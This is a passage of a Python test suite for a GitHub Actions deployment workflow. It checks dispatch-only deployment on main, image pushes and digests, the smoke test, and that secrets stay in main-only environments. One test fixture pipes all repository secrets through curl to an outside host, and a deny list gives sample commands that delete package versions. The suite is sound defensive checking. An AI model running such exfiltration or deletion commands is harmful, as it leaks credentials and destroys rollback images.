"""The deployment workflow (.github/workflows/deploy.yml, read as JSON from scripts/render.sh): who pushes images, who
moves the branch `deploy` and when (only a dispatch on main, started on the user's request). Each test names a property of docs/features/deploy/spec.md ("Wdrożenie nowej
wersji", D4) that a careless edit of the workflow would break without any other check noticing. The last classes read every
workflow of the repository: the deployment waits in the environment `production`, and no secret of Actions other than
GITHUB_TOKEN is used outside a job whose environment only admits main (docs/features/agent-security/spec.md, R5)."""

import copy
import json
import re
import types
import unittest

from support import REPO, RENDER

APPS = ("api", "store", "admin", "elasticsearch")
PUSH_EVENT = re.compile(r"event_name\s*[!=]=\s*'push'|GITHUB_EVENT_NAME\"?\s*=\s*push")
SHA_PIN = re.compile(r"^[\w.-]+/[\w.-]+@[0-9a-f]{40}$")

workflow = json.loads((RENDER / "deploy-workflow.json").read_text())
jobs = workflow["jobs"]

# A deployment is a dispatch on main, nothing else: not a push, not a pull request, not a dispatch on another branch.
ON_MAIN = "github.event_name == 'workflow_dispatch' && github.ref == 'refs/heads/main'"
EVENTS = (
    ("workflow_dispatch", "refs/heads/main", True),
    ("workflow_dispatch", "refs/heads/feat/x", False),
    ("workflow_dispatch", "refs/heads/main-2", False),
    ("workflow_dispatch", "refs/tags/main", False),
    ("pull_request", "refs/pull/1/merge", False),
    ("push", "refs/heads/main", False),
)


def evaluate(expression, event, ref):
    """The few operators the conditions use (==, !=, &&, ||) on github.event_name and github.ref."""
    github = types.SimpleNamespace(event_name=event, ref=ref)
    python = expression.strip().removeprefix("${{").removesuffix("}}").replace("&&", " and ").replace("||", " or ")
    return eval(python, {"__builtins__": {}}, {"github": github})  # noqa: S307 - our own workflow, fixed vocabulary


def steps(job):
    return jobs[job]["steps"]


def uses(step, action):
    return step.get("uses", "").startswith(action + "@")


def run_scripts(job=None):
    selected = [jobs[job]] if job else jobs.values()
    return [step["run"] for j in selected for step in j["steps"] if "run" in step]


class Triggers(unittest.TestCase):
    def test_there_is_no_push_trigger(self):
        self.assertNotIn("push", workflow["on"])
        self.assertEqual({"pull_request", "workflow_dispatch"}, set(workflow["on"]))
        # Neither an expression nor a shell script asks whether the event is a push.
        texts = [json.dumps(workflow["concurrency"]), json.dumps(workflow["env"])]
        texts += [str(job.get("if", "")) for job in jobs.values()]
        texts += [str(step.get("if", "")) for job in jobs.values() for step in job["steps"]]
        texts += [json.dumps(step.get("env", {})) for job in jobs.values() for step in job["steps"]]
        texts += run_scripts()
        for text in texts:
            self.assertIsNone(PUSH_EVENT.search(text), text)

    def test_the_push_check_catches_the_old_forms(self):
        for old in ("github.event_name == 'push'", "github.event_name != 'push'", 'if [ "$GITHUB_EVENT_NAME" = push ]; then'):
            self.assertIsNotNone(PUSH_EVENT.search(old), old)

    def test_images_are_pushed_and_deploy_moves_only_for_a_dispatch_on_main(self):
        self.assertEqual(ON_MAIN, jobs["images"]["if"])
        self.assertEqual(ON_MAIN, jobs["deploy"]["if"])
        self.assertEqual("${{ %s }}" % ON_MAIN, workflow["env"]["DEPLOY"])

    def test_the_conditions_hold_only_for_a_dispatch_on_main(self):
        for event, ref, expected in EVENTS:
            for expression in (jobs["images"]["if"], jobs["k8s-check"]["if"], jobs["deploy"]["if"], workflow["env"]["DEPLOY"]):
                self.assertIs(expected, evaluate(expression, event, ref), f"{event} on {ref}: {expression}")

    def test_a_dispatch_on_another_branch_is_a_smoke_rehearsal_only(self):
        # Everything that publishes or needs the registry (the images, the values file, the pull of the pushed images, the
        # token) hangs on the one condition; the smoke job itself runs for every event, and nothing else asks for the event.
        self.assertNotIn("event_name", jobs["smoke"]["if"])
        for step in steps("smoke"):
            self.assertNotIn("event_name", step.get("if", ""), step.get("name"))
        gated = [s["name"] for s in steps("smoke") if s.get("if") == "env.DEPLOY == 'true'"]
        self.assertEqual(["Write the images values file", "Pull the pushed images by digest"], gated)

    def test_pull_requests_run_the_smoke_test_for_the_files_that_decide_the_images(self):
        paths = workflow["on"]["pull_request"]["paths"]
        for path in ("infra/**", "apps/*/Dockerfile", "apps/api/config/**", "apps/api/bin/**", "apps/api/composer.lock",
                     "apps/store/package-lock.json", "apps/admin/package-lock.json", "apps/store/next.config.ts"):
            self.assertIn(path, paths)
        self.assertIn("workflow_dispatch", workflow["on"])

    def test_runs_for_main_are_never_cancelled_and_other_runs_are(self):
        self.assertEqual("deploy-${{ github.ref }}", workflow["concurrency"]["group"])
        self.assertEqual("${{ github.ref != 'refs/heads/main' }}", workflow["concurrency"]["cancel-in-progress"])
        for event, ref, _ in EVENTS:
            cancel = evaluate(workflow["concurrency"]["cancel-in-progress"], event, ref)
            self.assertIs(ref != "refs/heads/main", cancel, (event, ref))


class Images(unittest.TestCase):
    def pushes(self):
        return [s for j in jobs for s in steps(j) if uses(s, "docker/build-push-action") and s["with"].get("push") is True]

    def test_four_images_tagged_with_the_commit_sha_and_only_there(self):
        pushed = self.pushes()
        self.assertEqual(4, len(pushed))
        for app in APPS:
            tags = [s["with"]["tags"] for s in pushed if s["with"]["context"].endswith(app if app != "elasticsearch" else "infra/elasticsearch")]
            self.assertEqual(["${{ env.IMAGE_PREFIX }}/%s:${{ github.sha }}" % app], tags)
        for step in pushed:
            self.assertIn(step, steps("images"), "an image is pushed outside the job images")

    def test_the_prefix_is_the_registry_of_the_chart(self):
        values = (REPO / "infra/k8s/charts/shop/values.yaml").read_text()
        self.assertIn("registry: " + workflow["env"]["IMAGE_PREFIX"], values)

    def test_production_stages_as_the_smoke_test_builds_them(self):
        smoke = (REPO / "infra/k8s/scripts/smoke.sh").read_text()
        for job in ("images", "smoke"):
            built = [s["with"] for s in steps(job) if uses(s, "docker/build-push-action")]
            self.assertEqual({"apps/api", "apps/store", "apps/admin", "infra/elasticsearch"}, {b["context"] for b in built})
            for b in built:
                self.assertEqual("prod" if b["context"].startswith("apps/") else None, b.get("target"))
        self.assertIn('--target prod -t "$registry/$app:r1" "$TOOLS_REPO/apps/$app"', smoke)
        self.assertIn('-t "$registry/elasticsearch:r1" "$TOOLS_REPO/infra/elasticsearch"', smoke)

    def test_an_existing_tag_is_kept_not_rebuilt(self):
        by_id = {s["id"]: s for s in steps("images") if "id" in s and s["id"].startswith("build-")}
        self.assertEqual(sorted("build-" + a for a in APPS), sorted(by_id))
        for app in APPS:
            self.assertEqual("steps.existing.outputs.%s == ''" % app, by_id["build-" + app]["if"])

    def test_the_digests_of_all_four_images_and_the_values_file_are_job_outputs(self):
        self.assertEqual(sorted(APPS) + ["values", "values_sha256"], sorted(jobs["images"]["outputs"]))

    def test_no_latest_tag(self):
        self.assertNotRegex(json.dumps(workflow), r"[:@]latest")


class Smoke(unittest.TestCase):
    def test_it_runs_after_the_images_on_a_deployment_and_never_pushes(self):
        self.assertEqual("images", jobs["smoke"]["needs"])
        condition = jobs["smoke"]["if"]
        self.assertIn("needs.images.result == 'success'", condition)
        self.assertIn("needs.images.result == 'skipped'", condition)
        self.assertNotIn("failure", condition)

    def test_on_a_deployment_it_uses_the_pushed_images_by_digest_otherwise_it_builds_them(self):
        pull = next(s for s in steps("smoke") if s.get("name") == "Pull the pushed images by digest")
        self.assertEqual("env.DEPLOY == 'true'", pull["if"])
        self.assertIn('"$IMAGE_PREFIX/$app@${!digest}"', pull["run"])
        for step in steps("smoke"):
            if uses(step, "docker/build-push-action"):
                self.assertEqual("env.DEPLOY != 'true'", step["if"])
                self.assertIs(True, step["with"]["load"])

    def test_the_images_are_loaded_into_the_daemon_that_smoke_sh_builds_on(self):
        """smoke.sh builds `FROM <registry>/api:r1` with a plain `docker build` (SMOKE_BREAK): the base must be in the
        local daemon and the builder in use must be the default one, a docker-container builder would look for the base
        in docker.io."""
        smoke = (REPO / "infra/k8s/scripts/smoke.sh").read_text()
        self.assertIn("FROM %s/api:r1", smoke)
        self.assertIn("FROM %s/store:r1", smoke)
        buildx = next(s for s in steps("smoke") if uses(s, "docker/setup-buildx-action"))
        self.assertIs(False, buildx["with"]["use"])
        builds = [s for s in steps("smoke") if uses(s, "docker/build-push-action")]
        self.assertEqual(4, len(builds))
        for step in builds:
            self.assertEqual("${{ steps.%s.outputs.name }}" % buildx["id"], step["with"]["builder"])
            self.assertIs(True, step["with"]["load"])
            self.assertNotIn("push", step["with"])

    def test_it_runs_the_smoke_test_on_the_images_it_prepared(self):
        script = "\n".join(run_scripts("smoke"))
        self.assertIn("SMOKE_BUILD=0 make -C infra/k8s smoke", script)
        project = workflow["env"]["COMPOSE_PROJECT_NAME"]
        self.assertEqual("shop-smoke-sm-" + project, workflow["env"]["SMOKE_REGISTRY"])
        for step in steps("smoke"):
            if uses(step, "docker/build-push-action"):
                self.assertTrue(step["with"]["tags"].startswith("${{ env.SMOKE_REGISTRY }}/"))
                self.assertTrue(step["with"]["tags"].endswith(":r1"))

    def test_peaks_go_to_the_summary_also_after_a_failure(self):
        summary = next(s for s in steps("smoke") if s.get("name") == "Resources in the summary")
        self.assertEqual("always()", summary["if"])
        self.assertIn("GITHUB_STEP_SUMMARY", summary["run"])
        self.assertIn("peak memory", summary["run"])
        self.assertIn("peak disk", summary["run"])


class ExistingImages(unittest.TestCase):
    def test_the_job_output_gets_the_digest_only_not_the_warnings_of_the_lookup(self):
        lookup = next(s for s in steps("images") if s.get("id") == "existing")["run"]
        self.assertNotIn("2>&1", lookup)
        self.assertIn('echo "$app=$digest" >> "$GITHUB_OUTPUT"', lookup)


def step_index(job, name):
    return [s.get("name") for s in steps(job)].index(name)


class ImagesValuesFile(unittest.TestCase):
    """B1 (spec, D4): the digests reach Argo CD in one file, generated once, that the smoke test installs and the snapshot
    on deploy-images contains."""

    def test_the_file_is_generated_once_in_the_images_job(self):
        scripts = {job: "\n".join(run_scripts(job)) for job in jobs}
        self.assertEqual(1, sum(script.count("images-values.sh") for script in scripts.values()))
        self.assertIn('sh infra/k8s/scripts/images-values.sh "$GITHUB_SHA"', scripts["images"])
        generate = next(s for s in steps("images") if s.get("id") == "values")
        self.assertEqual({f"DIGEST_{a.upper()}": "${{ steps.digests.outputs.%s }}" % a for a in APPS}, generate["env"])
        self.assertIn("sha256sum", generate["run"])
        self.assertEqual("${{ steps.values.outputs.values }}", jobs["images"]["outputs"]["values"])

    def test_smoke_and_deploy_write_the_same_bytes_and_check_the_checksum(self):
        for job in ("smoke", "deploy"):
            write = next(s for s in steps(job) if s.get("name") == "Write the images values file")
            self.assertEqual("${{ needs.images.outputs.values }}", write["env"]["IMAGES_VALUES"])
            self.assertEqual("${{ needs.images.outputs.values_sha256 }}", write["env"]["IMAGES_VALUES_SHA256"])
            self.assertIn("printf '%s\\n' \"$IMAGES_VALUES\"", write["run"])
            self.assertIn("sha256sum -c -", write["run"])
            # The content goes through the environment, never into the script text (injection).
            self.assertNotIn("${{", write["run"])

    def test_the_output_is_read_through_the_environment_everywhere(self):
        for job in jobs:
            for step in steps(job):
                if "run" in step:
                    self.assertNotIn("outputs.values", step["run"])


class SmokeValues(unittest.TestCase):
    def test_on_a_deployment_the_first_install_uses_the_values_file_and_the_registry(self):
        smoke = next(s for s in steps("smoke") if s.get("name") == "Smoke test")
        self.assertIn('if [ "$DEPLOY" = true ]; then', smoke["run"])
        self.assertIn('export SMOKE_VALUES="$RUNNER_TEMP/values-images.yaml"', smoke["run"])
        self.assertLess(smoke["run"].index("export SMOKE_VALUES"), smoke["run"].index("make -C infra/k8s smoke"))
        self.assertLess(step_index("smoke", "Write the images values file"), step_index("smoke", "Smoke test"))

    def test_the_token_is_read_only_for_packages_and_only_given_on_a_deployment(self):
        smoke = next(s for s in steps("smoke") if s.get("name") == "Smoke test")
        self.assertEqual("${{ env.DEPLOY == 'true' && secrets.GITHUB_TOKEN || '' }}", smoke["env"]["SMOKE_GHCR_TOKEN"])
        self.assertEqual("${{ env.DEPLOY == 'true' && github.actor || '' }}", smoke["env"]["SMOKE_GHCR_USER"])
        self.assertEqual("read", jobs["smoke"]["permissions"]["packages"])
        self.assertNotIn("SMOKE_GHCR_TOKEN", smoke["run"])
        holders = [(j, s.get("name")) for j in jobs for s in steps(j) if "SMOKE_GHCR_TOKEN" in json.dumps(s.get("env", {}))]
        self.assertEqual([("smoke", "Smoke test")], holders)

    def test_smoke_sh_uses_the_values_file_and_checks_the_digests_of_the_pods(self):
        smoke = (REPO / "infra/k8s/scripts/smoke.sh").read_text()
        self.assertIn("-f environments/ci/values.yaml -f /kube/values-images.yaml $(smoke_pull_args)", smoke)
        self.assertIn("check_registry_images", smoke)
        self.assertIn('--registry-config $k3d_dir/registries.yaml', smoke)
        self.assertIn('K3D_MOUNT="$k3d_dir:$k3d_dir:ro"', smoke)
        self.assertIn("umask 077", smoke)
        self.assertIn("unset SMOKE_GHCR_TOKEN", smoke)
        # The token is only ever written to the private file, never printed.
        self.assertNotRegex(smoke, r"echo[^\n]*SMOKE_GHCR_TOKEN")


    def test_the_kubelet_of_the_smoke_cluster_runs_the_imported_images_under_any_name(self):
        # On main the kubelet pulls the images from GHCR first and keeps a pull record per image ID that names only the
        # repository of GHCR; with the default policy the same image ID imported as shop-smoke-.../<app>:r2 is refused
        # under pullPolicy Never (ErrImageNeverPull). The cluster runs only images loaded into it, so nothing is verified.
        smoke = (REPO / "infra/k8s/scripts/smoke.sh").read_text()
        self.assertIn("imagePullCredentialsVerificationPolicy: NeverVerify", smoke)
        self.assertIn('-v "$k3d_dir/90-smoke-kubelet.conf:/var/lib/rancher/k3s/agent/etc/kubelet.conf.d/90-smoke-kubelet.conf@server:*"', smoke)
        self.assertIn('"imagePullCredentialsVerificationPolicy":"NeverVerify"', smoke)
        self.assertLess(smoke.index("check_kubelet_policy\n"), smoke.index('log "install r1"'))

class Deploy(unittest.TestCase):
    def test_it_needs_a_green_smoke_test_and_the_images(self):
        self.assertEqual(["images", "smoke", "k8s-check"], jobs["deploy"]["needs"])
        self.assertNotIn("continue-on-error", jobs["smoke"])
        self.assertNotIn("continue-on-error", jobs["deploy"])

    def test_it_publishes_only_with_the_script_without_force(self):
        scripts = "\n".join(run_scripts())
        self.assertNotIn("git push", scripts)
        self.assertNotIn("--force", scripts)
        self.assertEqual(1, scripts.count("deploy-ref.sh"))
        self.assertIn(
            'sh .github/scripts/deploy-ref.sh "$GITHUB_SHA" "git@github.com:$GITHUB_REPOSITORY.git" "$RUNNER_TEMP/values-images.yaml"',
            scripts,
        )

    def test_the_script_pushes_both_branches_in_one_atomic_push(self):
        script = (REPO / ".github/scripts/deploy-ref.sh").read_text()
        pushes = [line for line in script.splitlines() if "git push" in line and not line.lstrip().startswith("#")]
        self.assertEqual(1, len(pushes), pushes)
        self.assertIn("--atomic", pushes[0])
        self.assertIn('"$sha:refs/heads/deploy" "$snapshot:refs/heads/deploy-images"', pushes[0])
        self.assertNotRegex(pushes[0], r"--force|\s\+")

    def test_the_render_of_prod_is_checked_before_anything_is_published(self):
        verify = next(s for s in steps("deploy") if s.get("name") == "Check the render of prod with the images values file")
        self.assertEqual('sh infra/k8s/scripts/verify-images.sh "$RUNNER_TEMP/values-images.yaml" "$GITHUB_SHA"', verify["run"])
        order = [s.get("name") for s in steps("deploy")]
        self.assertLess(order.index("Write the images values file"), order.index("Check the render of prod with the images values file"))
        self.assertLess(order.index("Check the render of prod with the images values file"), order.index("Publish deploy and deploy-images"))
        self.assertNotIn("if", verify)
        self.assertNotIn("continue-on-error", verify)

    def test_the_checkout_has_the_full_history_and_leaves_no_token(self):
        checkout = next(s for s in steps("deploy") if uses(s, "actions/checkout"))
        self.assertEqual(0, checkout["with"]["fetch-depth"])
        self.assertIs(False, checkout["with"]["persist-credentials"])

    def test_the_key_is_in_the_environment_of_one_step_only(self):
        holders = [(j, s.get("name")) for j in jobs for s in steps(j) if "DEPLOY_KEY" in json.dumps(s.get("env", {}))]
        self.assertEqual([("deploy", "Publish deploy and deploy-images")], holders)
        self.assertNotIn("DEPLOY_KEY", json.dumps({k: v for k, v in workflow.items() if k != "jobs"}))
        for job in jobs.values():
            self.assertNotIn("DEPLOY_KEY", json.dumps(job.get("env", {})))
        self.assertNotIn("set -x", "\n".join(run_scripts()))


class Retention(unittest.TestCase):
    """The branch deploy-images points at digests of images in GHCR, and a rollback means going back to an older
    snapshot: no workflow may delete versions of the packages (a retention policy would break the rollback)."""

    FORBIDDEN = (
        r"delete-package-versions",
        r"actions/delete-package",
        r"container-retention",
        r"snok/container-retention-policy",
        r"-X\s+DELETE",
        r"--method\s+DELETE",
        r"/packages/container/[^\s]*/versions",
        r"gh\s+api[^\n]*packages",
    )

    def test_no_workflow_deletes_package_versions(self):
        workflows = sorted((REPO / ".github/workflows").glob("*.yml"))
        self.assertGreaterEqual(len(workflows), 2)
        for path in workflows:
            text = path.read_text()
            for pattern in self.FORBIDDEN:
                self.assertIsNone(re.search(pattern, text, re.I), f"{path.name} matches {pattern}")

    def test_the_patterns_catch_the_usual_ways(self):
        for example in (
            "uses: actions/delete-package-versions@v5",
            "uses: snok/container-retention-policy@v3",
            "gh api -X DELETE /user/packages/container/shop%2Fapi/versions/1",
            "curl --method DELETE https://api.github.com/orgs/x/packages/container/shop%2Fapi/versions/2",
        ):
            self.assertTrue(any(re.search(p, example, re.I) for p in self.FORBIDDEN), example)


class K8sCheck(unittest.TestCase):
    """CI runs `make -C infra/k8s check` only for a change under infra/k8s/** or .github/workflows/**
    (.github/scripts/scope.sh --k8s), so a change elsewhere that the chart must mirror (compose, Keycloak realms) is caught
    only by this job: every deployment runs it and nothing is published unless it passes."""

    def test_deploy_waits_for_the_check(self):
        self.assertIn("k8s-check", jobs["deploy"]["needs"])
        # Without a status function in its condition `deploy` runs only when every job it needs succeeded: a failed,
        # cancelled or skipped check publishes nothing.
        self.assertNotRegex(jobs["deploy"]["if"], r"always\(|failure\(|cancelled\(|success\(|result")
        self.assertNotIn("continue-on-error", jobs["k8s-check"])

    def test_it_runs_the_check_on_every_deployment(self):
        self.assertEqual(ON_MAIN, jobs["k8s-check"]["if"])
        check = [s for s in steps("k8s-check") if s.get("run") == "make -C infra/k8s check"]
        self.assertEqual(1, len(check))
        self.assertNotIn("if", check[0])
        self.assertNotIn("continue-on-error", check[0])

    def test_it_runs_beside_the_images_and_the_smoke_test_with_read_access_only(self):
        self.assertNotIn("needs", jobs["k8s-check"])
        self.assertEqual({"contents": "read"}, jobs["k8s-check"]["permissions"])
        self.assertNotIn("environment", jobs["k8s-check"])
        checkout = next(s for s in steps("k8s-check") if uses(s, "actions/checkout"))
        self.assertIs(False, checkout["with"]["persist-credentials"])


class Shell(unittest.TestCase):
    """GitHub runs a step without `shell:` as `bash -e {0}` (no pipefail): the status of `make smoke | tee log` would be
    that of `tee`, a red smoke test would give a green job and `deploy` would move the branch. `shell: bash` is
    `bash --noprofile --norc -eo pipefail {0}`."""

    def test_every_run_step_has_pipefail(self):
        self.assertEqual("bash", workflow.get("defaults", {}).get("run", {}).get("shell"))
        for name, job in jobs.items():
            self.assertNotIn("shell", job.get("defaults", {}).get("run", {}), name)
            for step in job["steps"]:
                self.assertNotIn("shell", step, f"{name}: {step.get('name')}")


class Permissions(unittest.TestCase):
    def test_only_the_job_that_pushes_images_can_write_packages(self):
        self.assertEqual({"contents": "read"}, workflow["permissions"])
        self.assertEqual({"contents": "read", "packages": "write"}, jobs["images"]["permissions"])
        for job in ("smoke", "deploy"):
            self.assertNotEqual("write", jobs[job]["permissions"].get("packages"))
            self.assertEqual("read", jobs[job]["permissions"]["contents"])

    def test_actions_are_pinned_by_sha(self):
        for job in jobs:
            for step in steps(job):
                if "uses" in step:
                    self.assertRegex(step["uses"], SHA_PIN)


class Production(unittest.TestCase):
    """The job that holds DEPLOY_KEY waits for the user in the environment `production` (R5)."""

    def test_the_deploy_job_runs_in_the_environment_production(self):
        self.assertEqual("production", environment_name(jobs["deploy"]))

    def test_only_the_deploy_job_has_the_environment_production(self):
        # An environment asks for the approval of the user: one approval per deployment, at the one job that publishes.
        # Another job may have an environment, but only one that admits main without an approval (not `production`).
        self.assertEqual([], misplaced_environments(workflow))

    def test_the_images_job_has_the_environment_sentry(self):
        # The secret SENTRY_AUTH_TOKEN is a secret of this environment (no approval, only main; infra/k8s/README.md).
        self.assertEqual("sentry", environment_name(jobs["images"]))

    def test_another_job_with_the_environment_production_is_refused(self):
        for name in jobs:
            if name == "deploy":
                continue
            for environment in ("production", {"name": "production"}, "merge-override", "staging", {"url": "https://x"}):
                with self.subTest(job=name, environment=environment):
                    found = misplaced_environments(variant(lambda w: w["jobs"][name].update(environment=environment)))
                    self.assertEqual([name], found)


def misplaced_environments(copied):
    """The jobs other than `deploy` whose environment asks for an approval or is not one that admits only main."""
    return [
        name for name, job in copied["jobs"].items()
        if name != "deploy" and "environment" in job
        and (environment_name(job) in APPROVAL_ENVIRONMENTS or environment_name(job) not in MAIN_ONLY_ENVIRONMENTS)
    ]


# The environments whose branch policy admits only main (Settings > Environments; infra/k8s/README.md says how the user sets
# them). The test cannot see the settings of GitHub: this list is what the runbook promises, so a new entry needs a new
# line of the runbook. The environment may be given as a name or as a mapping with a literal name.
MAIN_ONLY_ENVIRONMENTS = ("production", "sentry", "merge-override")
# Those of them that wait for the approval of the user, each with the one job of the repository that may use it. An approval
# is read as "deploy" or "merge this pull request": another job in the same environment would get the same secret (the deploy
# key, the key of the merge app) for one click on a request that looks the same.
APPROVAL_JOBS = {"production": ("deploy.yml", "deploy"), "merge-override": ("merge-override.yml", "merge")}
APPROVAL_ENVIRONMENTS = tuple(APPROVAL_JOBS)
# A workflow expression is case-insensitive and allows spaces around the dot: `SECRETS .X`, `secrets . X`, `secrets['X']`,
# `toJSON(secrets)` and `format('{0}', secrets.X)` all read a secret. The context is the word `secrets` that is not a property
# of another object (`steps.a.outputs.secrets`) nor part of a longer name. Only the dotted GITHUB_TOKEN is exempt.
STRING_LITERAL = re.compile(r"'(?:[^']|'')*'")
SECRETS_CONTEXT = re.compile(r"(?<![\w.\-])secrets(?![\w\-])", re.I)
GITHUB_TOKEN = re.compile(r"\s*\.\s*github_token(?![\w\-])", re.I)


def expressions(text):
    """The text between `${{` and `}}` of every expression of a string. The end is the first `}}` outside a string literal:
    GitHub reads `'}}'` as part of the literal (the apostrophes switch the state, so `''` inside a literal is an escape that
    leaves it as it was). An expression that is not closed goes to the end of the string."""
    found = []
    start = text.find("${{")
    while start != -1:
        index, quoted = start + 3, False
        while index < len(text):
            if text[index] == "'":
                quoted = not quoted
            elif not quoted and text.startswith("}}", index):
                break
            index += 1
        found.append(text[start + 3:index])
        start = text.find("${{", index + 2)
    return found


def environment_name(job):
    environment = job.get("environment")
    return environment.get("name") if isinstance(environment, dict) else environment


def strings(node, path=()):
    """Every string of a workflow (values and keys) with its path."""
    if isinstance(node, dict):
        for key, value in node.items():
            yield path + (key,), key
            yield from strings(value, path + (key,))
    elif isinstance(node, list):
        for index, value in enumerate(node):
            yield from strings(value, path + (index,))
    elif isinstance(node, str):
        yield path, node


def reads_a_secret(text):
    """Whether the expressions of a string use the context `secrets` for anything but secrets.GITHUB_TOKEN."""
    for expression in expressions(text):
        code = STRING_LITERAL.sub("''", expression)
        for match in SECRETS_CONTEXT.finditer(code):
            if not GITHUB_TOKEN.match(code, match.end()):
                return True
    return False


def secret_violations(workflow):
    """What breaks the rule of R5 in one workflow (parsed from YAML): a secret other than GITHUB_TOKEN anywhere but in a job
    whose environment only admits main, and `secrets: inherit` anywhere."""
    found = []
    stack = [((), workflow)]
    while stack:
        path, node = stack.pop()
        if isinstance(node, dict):
            for key, value in node.items():
                if isinstance(key, str) and key.lower() == "secrets" and isinstance(value, str) and value.strip().lower() == "inherit":
                    found.append("/".join(map(str, path + (key,))) + ": secrets: inherit passes every secret on")
                stack.append((path + (key,), value))
        elif isinstance(node, list):
            stack.extend((path + (index,), value) for index, value in enumerate(node))
    jobs_of = workflow.get("jobs") if isinstance(workflow.get("jobs"), dict) else {}
    for path, text in strings(workflow):
        # The condition `if` is an expression with or without the braces.
        if not reads_a_secret("${{ %s }}" % text if path and path[-1] == "if" and "${{" not in text else text):
            continue
        job = jobs_of.get(path[1]) if len(path) > 1 and path[0] == "jobs" else None
        if job is None:
            found.append("/".join(map(str, path)) + ": a secret at the level of the workflow")
        elif environment_name(job) not in MAIN_ONLY_ENVIRONMENTS:
            found.append("/".join(map(str, path)) + f": a secret in a job whose environment is {environment_name(job)!r}, not one of {MAIN_ONLY_ENVIRONMENTS}")
    return found


def variant(change):
    """A copy of the real deployment workflow with one change (a fixture that must not pass)."""
    copied = copy.deepcopy(workflow)
    change(copied)
    return copied


def add_step(copied, job, **step):
    copied["jobs"][job]["steps"].append(step)


class SecretsOnlyInMainOnlyEnvironments(unittest.TestCase):
    """R5: a workflow on a branch of a task can ask for any secret of the repository; only an environment with the policy
    "main only" keeps the value from it. So every use of a secret of Actions is in such a job."""

    def test_every_workflow_of_the_repository_is_read(self):
        # scripts/render.sh converts each file; a workflow it skipped (another extension) would escape the rule below.
        files = sorted(p.name for pattern in ("*.yml", "*.yaml") for p in (REPO / ".github/workflows").glob(pattern))
        rendered = sorted(p.name[: -len(".json")] for p in (RENDER / "workflows").glob("*.json"))
        self.assertIn("deploy.yml", files)
        self.assertEqual(files, rendered)

    def test_no_workflow_uses_a_secret_outside_a_main_only_environment(self):
        for path in sorted((RENDER / "workflows").glob("*.json")):
            with self.subTest(path.name):
                self.assertEqual([], secret_violations(json.loads(path.read_text())))

    def test_the_deploy_key_is_used_in_a_main_only_environment(self):
        step = next(s for s in steps("deploy") if "DEPLOY_KEY" in json.dumps(s.get("env", {})))
        self.assertTrue(reads_a_secret(step["env"]["DEPLOY_KEY"]))
        self.assertIn(environment_name(jobs["deploy"]), MAIN_ONLY_ENVIRONMENTS)

    def test_the_real_workflow_is_what_the_fixtures_start_from(self):
        self.assertEqual([], secret_violations(workflow))

    def test_the_deploy_job_without_its_environment_is_refused(self):
        found = secret_violations(variant(lambda w: w["jobs"]["deploy"].pop("environment", None)))
        self.assertEqual(1, len(found), found)
        self.assertIn("jobs/deploy/steps", found[0])

    def test_another_or_unknown_environment_is_refused(self):
        for environment in ("staging", "Production", "production ", "${{ vars.TARGET }}", {"name": "staging"}, {"url": "https://x"}, ["production"]):
            with self.subTest(environment=environment):
                self.assertNotEqual([], secret_violations(variant(lambda w: w["jobs"]["deploy"].update(environment=environment))))

    def test_the_environment_as_a_mapping_with_the_name_is_accepted(self):
        for environment in ({"name": "production"}, {"name": "production", "url": "https://worf.pl"}):
            self.assertEqual([], secret_violations(variant(lambda w: w["jobs"]["deploy"].update(environment=environment))))

    def test_a_secret_in_the_env_of_the_workflow_is_refused_even_next_to_production(self):
        for value in ("${{ secrets.OTHER }}", "${{ secrets.DEPLOY_KEY }}", "x${{ toJSON(secrets) }}"):
            found = secret_violations(variant(lambda w: w["env"].update(LEAK=value)))
            self.assertEqual(["env/LEAK: a secret at the level of the workflow"], found, value)

    def test_the_forms_of_the_expression_that_read_a_secret(self):
        forms = (
            "${{ secrets.X }}", "${{secrets.X}}", "${{ SECRETS.X }}", "${{ Secrets.x }}", "${{ secrets .X }}", "${{ secrets. X }}",
            "${{ secrets . X }}", "${{ secrets['X'] }}", "${{ secrets[ 'X' ] }}", "${{ secrets[format('{0}', 'X')] }}",
            "${{ toJSON(secrets) }}", "${{ toJson(SECRETS) }}", "${{ fromJSON(toJSON(secrets)).X }}", "${{ format('{0}', secrets.X) }}",
            "${{ github.ref == 'main' && secrets.X || '' }}", "${{ secrets.GITHUB_TOKENX }}", "${{ secrets.GITHUB_TOKEN_2 }}",
            "${{ secrets['GITHUB_TOKEN'] }}", "${{ secrets }}", "${{ secrets.GITHUB_TOKEN && secrets.X }}", "a ${{ x }} b ${{ secrets.X }}",
            "${{ secrets.X", "${{ secrets.GITHUB_TOKEN }} ${{ secrets.X }}", "${{\nsecrets.X\n}}",
            # `}}` inside a string literal does not end the expression (the reader of GitHub tracks the apostrophes)
            "${{ format('}}', secrets.X) }}", "${{ format('{0}}}', secrets.X) }}", "${{ '}}' }} ${{ secrets.X }}",
            "${{ format('it''s }}', secrets.X) }}",
        )
        for form in forms:
            self.assertTrue(reads_a_secret(form), form)

    def test_the_forms_that_read_no_secret_or_only_the_token_of_the_run(self):
        forms = (
            "${{ secrets.GITHUB_TOKEN }}", "${{ SECRETS.github_token }}", "${{ secrets . GITHUB_TOKEN }}", "${{ github.token }}",
            "${{ env.DEPLOY == 'true' && secrets.GITHUB_TOKEN || '' }}", "${{ steps.digests.outputs.secrets }}", "${{ needs.images.outputs.secrets }}",
            "${{ github.ref == 'secrets' }}", "${{ 'secrets.X' }}", "${{ vars.secrets }}", "${{ my-secrets.X }}", "secrets.X is not an expression",
            "echo secrets", "${{ github.sha }}", "", "${{ format('}}', github.sha) }}", "${{ '}}' }} secrets.X",
            "${{ format('{0}}}', secrets.GITHUB_TOKEN) }}",
        )
        for form in forms:
            self.assertFalse(reads_a_secret(form), form)

    def test_a_secret_anywhere_in_a_job_without_a_main_only_environment_is_refused(self):
        # (a place in the job, the change that puts the expression there)
        places = {
            "the env of a job": lambda w: w["jobs"]["smoke"].setdefault("env", {}).update(LEAK="${{ secrets.OTHER }}"),
            "the env of a step": lambda w: add_step(w, "smoke", name="x", env={"LEAK": "${{ secrets['OTHER'] }}"}, run="true"),
            "the with of a step": lambda w: add_step(w, "smoke", uses="actions/x@" + "0" * 40, **{"with": {"token": "${{ SECRETS.OTHER }}"}}),
            "the text of a script": lambda w: add_step(w, "smoke", run='echo "${{ toJSON(secrets) }}" | curl -d @- https://example.net'),
            "the condition of a step": lambda w: add_step(w, "smoke", run="true", **{"if": "secrets.OTHER != ''"}),
            "the condition with braces": lambda w: add_step(w, "smoke", run="true", **{"if": "${{ secrets.OTHER != '' }}"}),
